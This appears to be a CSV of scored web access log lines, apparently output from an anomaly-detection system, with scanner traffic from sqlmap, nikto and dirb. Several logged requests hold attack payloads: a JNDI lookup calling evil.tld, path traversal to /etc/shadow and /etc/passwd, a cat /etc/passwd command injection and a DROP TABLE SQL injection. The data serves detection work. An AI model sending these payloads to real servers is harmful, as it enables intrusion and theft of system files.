score_content,score_session,score_fused,line
1.9457032680511475,584.52197265625,293.2338379621506,{"remote_addr": "200.212.54.219", "time_local": "11/Jan/2025:09:07:17 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 17671, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
1.5737948417663574,649.8110961914062,325.6924455165863,{"remote_addr": "108.209.111.234", "time_local": "11/Jan/2025:09:07:18 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 17779, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
8.645522117614746,5962.71875,2985.6821360588074,{"remote_addr": "166.142.39.45", "time_local": "11/Jan/2025:09:07:18 -0700", "request": "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/2", "status": 403, "body_bytes_sent": 726, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.9072470664978027,5159.0166015625,2580.461924314499,{"remote_addr": "65.80.143.99", "time_local": "11/Jan/2025:09:07:19 -0700", "request": "GET /assets/app.js HTTP/2", "status": 401, "body_bytes_sent": 1289, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.69040060043335,112.3372573852539,58.51382899284363,{"remote_addr": "180.138.185.177", "time_local": "11/Jan/2025:09:07:20 -0700", "request": "HEAD /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8041, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.82216215133667,2181.65576171875,1091.7389619350433,{"remote_addr": "7.133.158.230", "time_local": "11/Jan/2025:09:07:20 -0700", "request": "PUT /wp-login.php HTTP/2", "status": 304, "body_bytes_sent": 3998, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.4906474351882935,81.09952545166016,41.295086443424225,{"remote_addr": "102.46.117.16", "time_local": "11/Jan/2025:09:07:21 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3460, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.2767539024353027,4.191643714904785,3.234198808670044,{"remote_addr": "70.175.156.250", "time_local": "11/Jan/2025:09:07:21 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 9600, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.7983509302139282,791.6839599609375,396.7411554455757,{"remote_addr": "71.1.144.105", "time_local": "11/Jan/2025:09:07:22 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 6179, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.3922263383865356,71.31083679199219,36.35153156518936,{"remote_addr": "99.114.218.4", "time_local": "11/Jan/2025:09:07:22 -0700", "request": "GET /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 10931, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.616471290588379,3.6806588172912598,3.1485650539398193,{"remote_addr": "80.83.146.220", "time_local": "11/Jan/2025:09:07:24 -0700", "request": "PUT / HTTP/2", "status": 200, "body_bytes_sent": 1727, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.3493950366973877,55.79840087890625,28.57389795780182,{"remote_addr": "51.132.99.136", "time_local": "11/Jan/2025:09:07:24 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 13252, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.3411387205123901,565.2415771484375,283.29135793447495,{"remote_addr": "17.189.64.84", "time_local": "11/Jan/2025:09:07:25 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 1201, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
6.606217384338379,812.3355102539062,409.4708638191223,{"remote_addr": "75.111.165.188", "time_local": "11/Jan/2025:09:07:25 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 17537, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
4.392226696014404,599.32763671875,301.8599317073822,{"remote_addr": "34.179.40.85", "time_local": "11/Jan/2025:09:07:27 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 4504, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
4.60642147064209,835.8486328125,420.22752714157104,{"remote_addr": "128.217.88.158", "time_local": "11/Jan/2025:09:07:28 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 15399, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
5.88623571395874,778.6898193359375,392.2880275249481,{"remote_addr": "120.31.17.46", "time_local": "11/Jan/2025:09:07:28 -0700", "request": "OPTIONS /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 3918, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
2.1856839656829834,726.2396850585938,364.21268451213837,{"remote_addr": "248.235.252.73", "time_local": "11/Jan/2025:09:07:29 -0700", "request": "PUT /server-status HTTP/2", "status": 204, "body_bytes_sent": 4289, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
2.1609041690826416,1475.0767822265625,738.6188431978226,{"remote_addr": "184.126.242.141", "time_local": "11/Jan/2025:09:07:30 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 13380, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
5.0678229331970215,727.4554443359375,366.26163363456726,{"remote_addr": "252.83.81.212", "time_local": "11/Jan/2025:09:07:31 -0700", "request": "HEAD /.env HTTP/2", "status": 200, "body_bytes_sent": 1407, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
2.160177230834961,5725.99072265625,2864.0754499435425,{"remote_addr": "137.91.70.243", "time_local": "11/Jan/2025:09:07:32 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 400, "body_bytes_sent": 875, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.5649007558822632,580.1080322265625,290.8364664912224,{"remote_addr": "177.196.146.226", "time_local": "11/Jan/2025:09:07:33 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 9021, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
2.562988758087158,768.6449584960938,385.60397362709045,{"remote_addr": "248.122.141.100", "time_local": "11/Jan/2025:09:07:33 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 16405, "http_referer": "-", "http_user_agent": "dirb/2.22"}
5.221217632293701,7427.9736328125,3716.597425222397,{"remote_addr": "245.87.15.10", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "HEAD /contact HTTP/2", "status": 429, "body_bytes_sent": 1084, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
2.7461934089660645,515.2971801757812,259.02168679237366,{"remote_addr": "167.151.77.151", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "DELETE /contact HTTP/2", "status": 200, "body_bytes_sent": 8737, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.405872344970703,15.951764106750488,9.178818225860596,{"remote_addr": "178.176.94.241", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5236, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.2867205142974854,582.2022705078125,291.744495511055,{"remote_addr": "45.31.230.102", "time_local": "11/Jan/2025:09:07:35 -0700", "request": "POST /api/products HTTP/2", "status": 200, "body_bytes_sent": 11041, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
6.315548419952393,729.1431884765625,367.72936844825745,{"remote_addr": "74.180.3.226", "time_local": "11/Jan/2025:09:07:36 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 2069, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
4.626763343811035,86.43310546875,45.52993440628052,{"remote_addr": "74.185.69.149", "time_local": "11/Jan/2025:09:07:37 -0700", "request": "HEAD /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 9695, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.2307190895080566,775.615966796875,388.4233429431915,{"remote_addr": "146.83.205.163", "time_local": "11/Jan/2025:09:07:38 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7741, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
1.283301830291748,814.229248046875,407.7562749385834,{"remote_addr": "36.184.230.94", "time_local": "11/Jan/2025:09:07:38 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10134, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
1.5665816068649292,829.4811401367188,415.52386087179184,{"remote_addr": "171.111.118.8", "time_local": "11/Jan/2025:09:07:39 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 3976, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
1.6884115934371948,834.7160034179688,418.202207505703,{"remote_addr": "245.216.25.69", "time_local": "11/Jan/2025:09:07:40 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 15266, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.4425920248031616,1354.5892333984375,678.0159127116203,{"remote_addr": "27.25.73.143", "time_local": "11/Jan/2025:09:07:41 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 302, "body_bytes_sent": 7688, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.4904208183288574,631.8932495117188,316.6918351650238,{"remote_addr": "78.168.142.57", "time_local": "11/Jan/2025:09:07:42 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 7486, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.7804744243621826,2.4001996517181396,2.090337038040161,{"remote_addr": "181.100.2.42", "time_local": "11/Jan/2025:09:07:43 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 5397, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.4843389987945557,568.6038818359375,285.544110417366,{"remote_addr": "87.54.37.6", "time_local": "11/Jan/2025:09:07:43 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 14403, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
3.6404054164886475,807.3825073242188,405.5114563703537,{"remote_addr": "145.208.138.159", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 11272, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
4.756624698638916,533.9049072265625,269.3307659626007,{"remote_addr": "69.216.125.37", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 10423, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.980111837387085,685.9042358398438,343.9421738386154,{"remote_addr": "100.47.244.18", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "PUT /.git/config HTTP/2", "status": 200, "body_bytes_sent": 909, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
5.101694583892822,19.717775344848633,12.409734964370728,{"remote_addr": "66.15.96.130", "time_local": "11/Jan/2025:09:07:45 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 14192, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.4060006141662598,565.3335571289062,283.86977887153625,{"remote_addr": "106.192.108.53", "time_local": "11/Jan/2025:09:07:46 -0700", "request": "DELETE /logout HTTP/2", "status": 200, "body_bytes_sent": 4349, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.4019010066986084,647.6183471679688,324.5101240873337,{"remote_addr": "235.218.74.32", "time_local": "11/Jan/2025:09:07:47 -0700", "request": "POST /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 13053, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
6.137350082397461,606.3582763671875,306.2478132247925,{"remote_addr": "50.231.139.22", "time_local": "11/Jan/2025:09:07:47 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 16279, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
1.3029372692108154,774.1961669921875,387.74955213069916,{"remote_addr": "185.98.204.252", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2398, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
2.8025641441345215,1858.99609375,930.8993289470673,{"remote_addr": "59.136.204.201", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "DELETE /profile HTTP/2", "status": 301, "body_bytes_sent": 11929, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
1.4113320112228394,632.2643432617188,316.8378376364708,{"remote_addr": "53.243.193.203", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "POST /.env HTTP/2", "status": 204, "body_bytes_sent": 5199, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.563640594482422,830.4150390625,416.4893398284912,{"remote_addr": "149.84.94.161", "time_local": "11/Jan/2025:09:07:50 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 4610, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
4.464870452880859,831.9690551757812,418.21696281433105,{"remote_addr": "222.25.126.97", "time_local": "11/Jan/2025:09:07:51 -0700", "request": "HEAD /server-status HTTP/2", "status": 200, "body_bytes_sent": 5020, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.4123667478561401,868.7447509765625,435.0785588622093,{"remote_addr": "152.34.3.34", "time_local": "11/Jan/2025:09:07:52 -0700", "request": "TRACE /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 8553, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
2.052522659301758,868.5684814453125,435.31050205230713,{"remote_addr": "89.132.164.150", "time_local": "11/Jan/2025:09:07:52 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1316, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
1.2686704397201538,583.2276611328125,292.2481657862663,{"remote_addr": "15.11.88.209", "time_local": "11/Jan/2025:09:07:53 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 12975, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
1.4532287120819092,790.1989135742188,395.82607114315033,{"remote_addr": "46.252.94.36", "time_local": "11/Jan/2025:09:07:53 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1968, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
7.006158351898193,5971.6171875,2989.311672925949,{"remote_addr": "178.89.127.126", "time_local": "11/Jan/2025:09:07:54 -0700", "request": "OPTIONS / HTTP/2", "status": 404, "body_bytes_sent": 447, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.4406511783599854,817.8465576171875,409.64360439777374,{"remote_addr": "141.32.128.93", "time_local": "11/Jan/2025:09:07:55 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 16692, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.3010224103927612,830.2716064453125,415.78631442785263,{"remote_addr": "40.212.122.64", "time_local": "11/Jan/2025:09:07:55 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 9944, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.4483669996261597,619.7618408203125,310.60510390996933,{"remote_addr": "50.77.37.99", "time_local": "11/Jan/2025:09:07:56 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 6106, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.5333659648895264,869.6282958984375,436.0808309316635,{"remote_addr": "143.28.206.146", "time_local": "11/Jan/2025:09:07:56 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 9998, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
4.462542533874512,567.38134765625,285.92194509506226,{"remote_addr": "17.66.216.180", "time_local": "11/Jan/2025:09:07:57 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 4295, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.5452814102172852,774.6661376953125,388.1057095527649,{"remote_addr": "125.120.2.160", "time_local": "11/Jan/2025:09:07:57 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 910, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
2.7039239406585693,824.6483154296875,413.67611968517303,{"remote_addr": "96.108.92.169", "time_local": "11/Jan/2025:09:07:58 -0700", "request": "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 14549, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.8997920751571655,633.2544555664062,317.5771238207817,{"remote_addr": "35.28.2.139", "time_local": "11/Jan/2025:09:07:59 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 9282, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.4198448657989502,633.5690307617188,317.49443781375885,{"remote_addr": "55.184.178.133", "time_local": "11/Jan/2025:09:07:59 -0700", "request": "GET /.env HTTP/2", "status": 201, "body_bytes_sent": 16108, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.1685672998428345,596.4395751953125,298.80407124757767,{"remote_addr": "163.89.138.10", "time_local": "11/Jan/2025:09:07:59 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 6688, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
1.6750218868255615,829.02099609375,415.3480089902878,{"remote_addr": "194.105.160.236", "time_local": "11/Jan/2025:09:08:00 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 3590, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
2.888864040374756,11833.8984375,5918.393650770187,{"remote_addr": "164.98.175.190", "time_local": "11/Jan/2025:09:08:01 -0700", "request": "TRACE /search?q=router HTTP/2", "status": 500, "body_bytes_sent": 599, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.6160783767700195,832.40478515625,418.51043176651,{"remote_addr": "159.143.101.180", "time_local": "11/Jan/2025:09:08:01 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 5557, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.3743724822998047,2142.7705078125,1072.0724401474,{"remote_addr": "75.120.173.11", "time_local": "11/Jan/2025:09:08:02 -0700", "request": "POST /.git/config HTTP/2", "status": 304, "body_bytes_sent": 5887, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
2.34887957572937,582.2625732421875,292.30572640895844,{"remote_addr": "127.120.252.249", "time_local": "11/Jan/2025:09:08:02 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 9521, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
6.084107875823975,112.1338882446289,59.10899806022644,{"remote_addr": "68.104.15.251", "time_local": "11/Jan/2025:09:08:03 -0700", "request": "OPTIONS /api/products HTTP/2", "status": 201, "body_bytes_sent": 3401, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.646260738372803,84.1256103515625,44.38593554496765,{"remote_addr": "68.235.172.87", "time_local": "11/Jan/2025:09:08:03 -0700", "request": "HEAD /dashboard HTTP/2", "status": 200, "body_bytes_sent": 5343, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.52164626121521,792.53271484375,397.0271805524826,{"remote_addr": "8.131.241.213", "time_local": "11/Jan/2025:09:08:04 -0700", "request": "POST /login HTTP/2", "status": 200, "body_bytes_sent": 14259, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.4859315156936646,2131.752685546875,1066.6193085312843,{"remote_addr": "161.130.203.190", "time_local": "11/Jan/2025:09:08:05 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 302, "body_bytes_sent": 11101, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
1.7969393730163574,532.390625,267.0937821865082,{"remote_addr": "250.46.137.55", "time_local": "11/Jan/2025:09:08:05 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 10742, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.5931931734085083,813.0594482421875,407.326320707798,{"remote_addr": "89.234.144.209", "time_local": "11/Jan/2025:09:08:05 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 4581, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.3534142971038818,2053.345703125,1027.349558711052,{"remote_addr": "14.9.230.38", "time_local": "11/Jan/2025:09:08:06 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 301, "body_bytes_sent": 12351, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
1.4989511966705322,2129.980712890625,1065.7398320436478,{"remote_addr": "176.218.156.123", "time_local": "11/Jan/2025:09:08:07 -0700", "request": "TRACE /api/products HTTP/2", "status": 302, "body_bytes_sent": 3555, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
5.943558692932129,74.67884826660156,40.311203479766846,{"remote_addr": "243.225.51.193", "time_local": "11/Jan/2025:09:08:07 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 8751, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
5.987201690673828,833.9373168945312,419.96225929260254,{"remote_addr": "208.76.236.180", "time_local": "11/Jan/2025:09:08:08 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 2997, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
4.456167697906494,689.0921630859375,346.774165391922,{"remote_addr": "243.87.189.180", "time_local": "11/Jan/2025:09:08:08 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 8123, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.321447491645813,2094.49853515625,1047.909991323948,{"remote_addr": "168.191.198.52", "time_local": "11/Jan/2025:09:08:09 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 14240, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
4.65806770324707,784.2420043945312,394.45003604888916,{"remote_addr": "117.94.182.21", "time_local": "11/Jan/2025:09:08:10 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 16413, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
2.342761278152466,597.8739013671875,300.10833132267,{"remote_addr": "153.130.236.137", "time_local": "11/Jan/2025:09:08:11 -0700", "request": "DELETE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 11092, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
2.988825798034668,11455.982421875,5729.485623836517,{"remote_addr": "76.157.145.77", "time_local": "11/Jan/2025:09:08:12 -0700", "request": "PUT /api/products HTTP/2", "status": 502, "body_bytes_sent": 961, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.4602243900299072,833.5560302734375,418.0081273317337,{"remote_addr": "39.235.238.144", "time_local": "11/Jan/2025:09:08:13 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 204, "body_bytes_sent": 12120, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
5.760372161865234,585.0722045898438,295.4162883758545,{"remote_addr": "14.150.198.94", "time_local": "11/Jan/2025:09:08:13 -0700", "request": "OPTIONS /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 6215, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
1.7302374839782715,565.7227172851562,283.72647738456726,{"remote_addr": "92.2.221.83", "time_local": "11/Jan/2025:09:08:14 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 8738, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
6.379585266113281,129.42137145996094,67.90047836303711,{"remote_addr": "82.174.252.129", "time_local": "11/Jan/2025:09:08:15 -0700", "request": "OPTIONS /about HTTP/2", "status": 200, "body_bytes_sent": 16608, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.1791789531707764,514.8840942382812,258.531636595726,{"remote_addr": "34.138.27.92", "time_local": "11/Jan/2025:09:08:15 -0700", "request": "PUT /logout HTTP/2", "status": 200, "body_bytes_sent": 4382, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.4251691102981567,779.2906494140625,390.3579092621803,{"remote_addr": "141.28.229.111", "time_local": "11/Jan/2025:09:08:15 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 14563, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
